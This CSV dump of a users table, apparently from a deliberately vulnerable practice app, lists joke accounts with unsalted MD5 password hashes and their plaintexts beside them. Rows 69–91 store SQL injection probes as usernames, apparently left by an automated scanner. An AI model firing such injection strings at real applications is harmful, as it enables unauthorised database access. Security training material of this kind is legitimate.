id,fname,password,username,description
1,admin,21232f297a57a5a743894a0e4a801fc3 (admin),admin,All hail the admin!!
2,bobby,5f4dcc3b5aa765d61d8327deb882cf99 (password),bob,Sup! I love swimming!
3,ramesh,9aeaed51f2b0f6680c4ed4b07fb1a83c (troll),ramesh,I love 5 star!
4,suresh,9aeaed51f2b0f6680c4ed4b07fb1a83c (troll),suresh,I love 5 star toooo!
5,alice,c93239cae450631e9f55d71aed99e918 (alice1),alice,In wonderland right now :O
6,voldemort,856936b417f82c06139c74fa73b1abbe (horcrux),voldemort,How dare you! Avada kedavra!
7,frodo,f0f8820ee817181d9c6852a097d70d8d (frodo),frodo,Need to go to Mordor. Like right now!
8,hodor,a55287e9d0b40429e5a944d10132c93e (hodor),hodor,Hodor
65,rambo,e52848c0eb863d96bc124737116f23a4 (rhombus),rhombus,Im the rambo!! Bwahahaha!
66,test,098f6bcd4621d373cade4e832627b4f6 (test),test,test
67,test,098f6bcd4621d373cade4e832627b4f6 (test),test,test
68,test,098f6bcd4621d373cade4e832627b4f6 (test),test,test
69,test,098f6bcd4621d373cade4e832627b4f6 (test),"test"") AND 6147=6407 AND (""Oolc""=""Oolc",test
70,test,098f6bcd4621d373cade4e832627b4f6 (test),"test"") AND 3711=3711 AND (""Yqym""=""Yqym",test
71,test,098f6bcd4621d373cade4e832627b4f6 (test),"test"" AND 2524=3664 AND ""Mxyb""=""Mxyb",test
72,test,098f6bcd4621d373cade4e832627b4f6 (test),"test"" AND 3711=3711 AND ""LIET""=""LIET",test
73,test,098f6bcd4621d373cade4e832627b4f6 (test),test) AND 3739=4305 AND (1670=1670,test
74,test,098f6bcd4621d373cade4e832627b4f6 (test),test) AND 3711=3711 AND (5246=5246,test
75,test,098f6bcd4621d373cade4e832627b4f6 (test),test)) AND 7291=3726 AND ((7018=7018,test
76,test,098f6bcd4621d373cade4e832627b4f6 (test),test)) AND 3711=3711 AND ((1756=1756,test
77,test,098f6bcd4621d373cade4e832627b4f6 (test),test AND 1720=5834,test
78,test,098f6bcd4621d373cade4e832627b4f6 (test),test AND 3711=3711,test
79,test,098f6bcd4621d373cade4e832627b4f6 (test),test AND 2438=2434-- JfuO,test
80,test,098f6bcd4621d373cade4e832627b4f6 (test),test AND 3711=3711-- TaRe,test
81,test,098f6bcd4621d373cade4e832627b4f6 (test),-4241,test
82,test,098f6bcd4621d373cade4e832627b4f6 (test),1,test
83,test,098f6bcd4621d373cade4e832627b4f6 (test),1,test
84,test,098f6bcd4621d373cade4e832627b4f6 (test),1,test
85,test,098f6bcd4621d373cade4e832627b4f6 (test),1,test
86,test,098f6bcd4621d373cade4e832627b4f6 (test),"-2286"") OR 4441=6796 AND (""PpzU""=""PpzU",test
87,test,098f6bcd4621d373cade4e832627b4f6 (test),"-7998"") OR 8911=8911 AND (""nQvm""=""nQvm",test
88,test,098f6bcd4621d373cade4e832627b4f6 (test),"-6009"" OR 5023=8761 AND ""ySjX""=""ySjX",test
89,test,098f6bcd4621d373cade4e832627b4f6 (test),"-9322"" OR 8911=8911 AND ""DwOP""=""DwOP",test
90,test,098f6bcd4621d373cade4e832627b4f6 (test),-4348) OR 9234=7819 AND (1780=1780,test
91,test,098f6bcd4621d373cade4e832627b4f6 (test),-7810) OR 8911=8911 AND (5709=5709,test
